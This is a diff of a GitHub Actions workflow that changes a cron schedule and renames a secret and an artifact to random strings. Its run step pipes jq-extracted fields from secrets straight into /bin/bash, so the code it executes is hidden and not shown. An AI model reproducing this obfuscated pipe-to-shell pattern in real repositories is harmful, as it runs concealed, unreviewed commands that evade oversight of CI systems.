@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '9 5,11,17,23 * * *'
+    - cron: '33 0,6,12,18 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -17,16 +17,15 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          c074: ${{ secrets.c074 }}
+          rdhnj351: ${{ secrets.rdhnj351 }}
         run: |
-          printf '%s' "$c074" | jq -r .t592 | /bin/bash
-          echo $rtni9 | jq -r .ry4970 | /bin/bash
-          echo $mdy4455 | jq -r .gt90 | /bin/bash
+          printf '%s' "$rdhnj351" | jq -r .ycg27401 | /bin/bash
+          printf '%s' "$v625" | jq -r .qw56603 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: SNcD1VRU
+          name: 8mgfqAd9
           path: "*.zip"
           retention-days: 1
